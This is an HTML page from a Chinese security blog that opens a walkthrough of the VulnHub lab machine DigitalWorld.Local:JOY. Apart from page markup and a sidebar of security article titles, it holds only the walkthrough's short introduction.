<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          VulnHub::DigitalWorld.Local:JOY Walkthrough - ca01h&#39;s Blog
        
    </title>

    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
	
<link rel="stylesheet" href="/css/fontawesome/all.css">

	
<script src="/js/fontawesome/all.js"></script>

    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="ca01h's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<body>

<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>CA01H&#39;S BLOG</span>
  </a>
</div>
    <div class="book-menu">
  <h1 id="æ–‡ç« å½’æ¡£"><a href="/archives/index.html"><strong>æ–‡ç« å½’æ¡£</strong></a></h1>
<h1 id="ç½®é¡¶æ–‡ç« "><strong>ç½®é¡¶æ–‡ç« </strong></h1>
<ul>
<li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li>
</ul>
<h1 id="Webå®‰å…¨"><strong>Webå®‰å…¨</strong></h1>
<h2 id="Webå®‰å…¨åŸºç¡€">Webå®‰å…¨åŸºç¡€</h2>
<ul>
<li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">åœ¨Ubuntu18.04å®‰è£…LNMP</a></li>
<li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQLæ•°æ®åº“åŸºæœ¬æ“ä½œ</a></li>
<li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQLçš„ç³»ç»Ÿè¡¨ã€æ–‡ä»¶è¯»å†™</a></li>
<li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">æ•°æ®åº“ç³»ç»ŸåŠŸèƒ½ç›¸å…³å­¦ä¹ </a></li>
<li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">æ•°æ®åº“æ³¨å…¥è¯­å¥çš„æ”¶é›†å’Œå­¦ä¹ </a></li>
<li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Webé¡µé¢è§£æçš„æµç¨‹å­¦ä¹ </a></li>
<li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">å„ç§æ³¨å…¥ç±»å‹çš„ç¯å¢ƒæ­å»ºå’Œä»£ç ç¼–å†™</a></li>
<li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labsæ‰‹å·¥æ³¨å…¥(ä¸€)</a></li>
<li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labsæ‰‹å·¥æ³¨å…¥(äºŒ)</a></li>
<li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMapå…¥é—¨å­¦ä¹ </a></li>
<li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQLæ³¨å…¥â€”â€”åŒæŸ¥è¯¢æ³¨å…¥</a></li>
<li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSSæ¼æ´å®æˆ˜å­¦ä¹ </a></li>
<li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨</a></li>
<li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">å˜é‡è¦†ç›–æ¼æ´åˆ©ç”¨</a></li>
<li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨</a></li>
<li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRFæ¼æ´åˆ©ç”¨</a></li>
<li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨</a></li>
<li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">é€»è¾‘æ¼æ´åˆ©ç”¨</a></li>
<li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXEæ¼æ´åˆ©ç”¨</a></li>
<li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQLæ³¨å…¥ä¹‹MongoDB</a></li>
<li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQLæ³¨å…¥ä¸“é¡¹ä¹‹MySQLåŸºæœ¬æ³¨å…¥è¯­æ³•</a></li>
<li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">æµ…è°ˆLDAPæ³¨å…¥æ”»å‡»</a></li>
<li><a href="/Web_security/basic_learning/26.MySQL%E6%94%BB%E5%87%BB%E9%9D%A2%E5%92%8C%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93">MySQLæ”»å‡»é¢å’Œææƒæ€»ç»“</a></li>
<li><a href="/Web_security/basic_learning/27.SQL%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C">SQLæ³¨å…¥æ‰‹å†Œ</a></li>
</ul>
<h2 id="PHPç›¸å…³">PHPç›¸å…³</h2>
<ul>
<li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHPå›è°ƒåé—¨</a></li>
<li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHPååºåˆ—åŒ–â€”â€”åŸºç¡€ç¯‡</a></li>
<li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHPååºåˆ—åŒ–â€”â€”Phar</a></li>
<li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHPååºåˆ—åŒ–â€”â€”Session</a></li>
<li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHPååºåˆ—åŒ–-åŸç”Ÿç±»åˆ©ç”¨</a></li>
<li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHPæ— æ•°å­—å­—æ¯æ„é€ webshell</a></li>
<li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHPæ— å‚æ•°å‡½æ•°çš„åˆ©ç”¨</a></li>
<li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLFåˆ©ç”¨</a></li>
<li><a href="/Web_security/php_related/11.PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90">PHPå¤æ‚å˜é‡è§£æ</a></li>
<li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
<li><a href="/Web_security/php_related/13.session.upload_progress+LFI%E5%AE%9E%E7%8E%B0RCE">session.upload-progress+LFIå®ç°RCE</a></li>
</ul>
<h2 id="Writeups">Writeups</h2>
<ul>
<li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li>
<li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTFâ€”PHPä»£å®¡</a></li>
<li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTFâ€”PHPæ¡†æ¶æ¼æ´</a></li>
<li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTFâ€”PHPååºåˆ—åŒ–</a></li>
<li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTFâ€”SQLæ³¨å…¥</a></li>
<li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTFâ€”XSS</a></li>
<li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTFâ€”SSRF</a></li>
<li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTFâ€”å‘½ä»¤æ‰§è¡Œ</a></li>
<li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTFâ€”æ–‡ä»¶ä¸Šä¼ </a></li>
<li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTFâ€”æ–‡ä»¶åŒ…å«</a></li>
<li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTFâ€”Python</a></li>
<li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTFâ€”NodeJS</a></li>
<li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTFâ€”Rubyå’ŒGo</a></li>
<li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTFâ€”æ¸—é€æµ‹è¯•</a></li>
<li><a href="/Web_security/ctf_writeup/25.CTFShow-Web%E5%85%A5%E9%97%A8">CTFShowâ€”Webå…¥é—¨</a></li>
<li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020ç”µä¿¡å¤©ç¿¼æ¯CTFâ€”APITest</a></li>
<li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">æ˜Ÿç›Ÿ6æœˆAWD Web+Pwn</a></li>
<li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020ä¸ƒæœˆèµ› Web</a></li>
<li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li>
<li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020ç¬¬äº”ç©ºé—´CTF Web</a></li>
<li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">é¦–å±Šé’“é±¼åŸæ¯CTF</a></li>
<li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTFå…«æœˆèµ›</a></li>
<li><a href="/Web_security/ctf_writeup/24.CTFShow-1024%E6%9D%AF-Web-Writeup">CTFShow 1024æ¯ Web</a></li>
<li><a href="/Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis%E5%A4%8D%E7%8E%B0">ByteCTF2020 Web</a></li>
<li><a href="/Web_security/ctf_writeup/27.UNCTF2020-Web-Writeup">UNCTF2020 Web</a></li>
<li><a href="/Web_security/ctf_writeup/28.%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Web-Writeups">ç¾ŠåŸæ¯2020 Web</a></li>
<li><a href="/Web_security/ctf_writeup/29.NCTF2019-PharMatchesEverything">NCTF2019 Phar matches everything</a></li>
</ul>
<h1 id="é¶æœºç³»åˆ—"><strong>é¶æœºç³»åˆ—</strong></h1>
<h2 id="HackTheBox">HackTheBox</h2>
<ul>
<li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li>
<li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li>
<li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li>
<li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li>
<li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li>
<li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li>
<li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li>
<li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li>
<li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li>
<li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li>
<li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li>
<li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li>
<li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li>
<li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li>
<li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li>
<li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li>
<li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li>
<li><a href="/Target_drone/HackTheBox/18.HTB-Admirer-walkthrough">HTB::Admirer</a></li>
</ul>
<h2 id="VulnHub">VulnHub</h2>
<ul>
<li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li>
<li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li>
<li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li>
</ul>
<h1 id="ä»£ç å®¡è®¡"><strong>ä»£ç å®¡è®¡</strong></h1>
<h2 id="PHPä»£ç å®¡è®¡">PHPä»£ç å®¡è®¡</h2>
<ul>
<li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day1</a></li>
<li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day2</a></li>
<li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day3</a></li>
<li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day4</a></li>
<li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day5</a></li>
<li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHPä»£ç å®¡è®¡å¤ç°â€”yixuncms</a></li>
<li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHPä»£ç å®¡è®¡å¤ç°â€”chinaz</a></li>
<li><a href="/code_audit/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95">CVE-2020-15148 Yii2ååºåˆ—åŒ–</a></li>
</ul>
<h1 id="æµé‡åˆ†æ"><strong>æµé‡åˆ†æ</strong></h1>
<ul>
<li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li>
<li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li>
<li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Broè¯­æ³•å­¦ä¹ ä¹‹åŸºç¡€çŸ¥è¯†</a></li>
</ul>
<h1 id="æœºå™¨å­¦ä¹ "><strong>æœºå™¨å­¦ä¹ </strong></h1>
<h2 id="åŸºç¡€å­¦ä¹ ">åŸºç¡€å­¦ä¹ </h2>
<ul>
<li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li>
<li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li>
<li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li>
<li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">æœºå™¨å­¦ä¹ ä¸ç½‘ç»œå®‰å…¨ç›¸å…³çš„èµ„æ–™ï¼ˆè½¬ï¼‰</a></li>
</ul>
<h1 id="Python"><strong>Python</strong></h1>
<h2 id="Pythonç¼–ç¨‹">Pythonç¼–ç¨‹</h2>
<ul>
<li>
<p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Pythonå‡½æ•°çš„å‚æ•°</a></p>
</li>
<li>
<p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Pythonå‡½æ•°å¼ç¼–ç¨‹ä¹‹é«˜é˜¶å‡½æ•°</a></p>
</li>
<li>
<p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Pythonå‡½æ•°å¼ç¼–ç¨‹-é—­åŒ…</a></p>
</li>
<li>
<p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Pythonå‡½æ•°å¼ç¼–ç¨‹-è£…é¥°å™¨</a></p>
</li>
<li>
<p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Pythoné¢å‘å¯¹è±¡é«˜çº§ç¼–ç¨‹ä¹‹slotsã€@propertyå’Œå¤šé‡ç»§æ‰¿</a></p>
</li>
<li>
<p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIOç¼–ç¨‹</a></p>
</li>
</ul>
<h1 id="Java"><strong>Java</strong></h1>
<h2 id="Javaç¼–ç¨‹">Javaç¼–ç¨‹</h2>
<ul>
<li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">JavaåŸºç¡€å­¦ä¹ ä¹‹JDKã€JREã€JVM</a></li>
<li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">JavaåŸºç¡€å­¦ä¹ ä¹‹æ ¸å¿ƒç±»</a></li>
<li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">JavaåŸºç¡€å­¦ä¹ ä¹‹é¢å‘å¯¹è±¡åŸºç¡€</a></li>
<li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">JavaåŸºç¡€å­¦ä¹ ä¹‹å¼‚å¸¸å¤„ç†</a></li>
</ul>
<h1 id="ç®—æ³•"><strong>ç®—æ³•</strong></h1>
<h2 id="Leetcode">Leetcode</h2>
<ul>
<li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li>
</ul>
<h1 id="éšç¬”"><strong>éšç¬”</strong></h1>
<h2 id="ç»éªŒ">ç»éªŒ</h2>
<ul>
<li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">ä»0åˆ°100åˆ†çš„è·¯ç¨‹â€”â€”å†™åœ¨2019å¹´çš„æœ€åä¸€å¤©</a></li>
</ul>
<h2 id="æŠ€æœ¯">æŠ€æœ¯</h2>
<ul>
<li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">é˜¿é‡Œäº‘Centos7-Ngnixéƒ¨ç½²Hexo</a></li>
<li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">é˜¿é‡Œäº‘OSS-PicGoæ­å»ºMarkdownå›¾åºŠ</a></li>
<li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexoæ¸²æŸ“LaTeXæ•°å­¦å…¬å¼</a></li>
<li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li>
<li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
  <div class="sidebar-toggle-inner"></div>
</div>

<script>
function add_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.add('show')  
}

function remove_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.remove('show')
}

function sidebar_toggle() {
    let sidebar_toggle = document.querySelector('.sidebar-toggle')
    let sidebar = document.querySelector('.book-sidebar')
    let content = document.querySelector('.off-canvas-content')
    if (sidebar_toggle.classList.contains('extend')) { // show
        sidebar_toggle.classList.remove('extend')
        sidebar.classList.remove('hide')
        content.classList.remove('extend')
    }
    else { // hide
        sidebar_toggle.classList.add('extend')
        sidebar.classList.add('hide')
        content.classList.add('extend')
    }
}
</script>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  
  <i class="fas fa-calendar-day"></i>&nbsp;2020-02-29&nbsp;
  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">1.8k</span>
  
  <h1 id="VulnHub-DigitalWorld-Local-JOY-Walkthrough">VulnHub::DigitalWorld.Local:JOY Walkthrough</h1>
<h2 id="0x01-Introduction">0x01 Introduction</h2>
<p>Does penetration testing spark joy? If it does, this machine is for you.</p>
<p>This machine is full of services, full of fun, but how many ways are there to align the stars? Perhaps, just like the child in all of us, we may find joy in a playground such as this.</p>
<p>This is somewhat OSCP-like for learning value, but is nowhere as easy to complete with an OSCP exam timeframe. But if you found this box because of preparation for the OSCP, you might as well try harder. ğŸ˜ƒ</p>
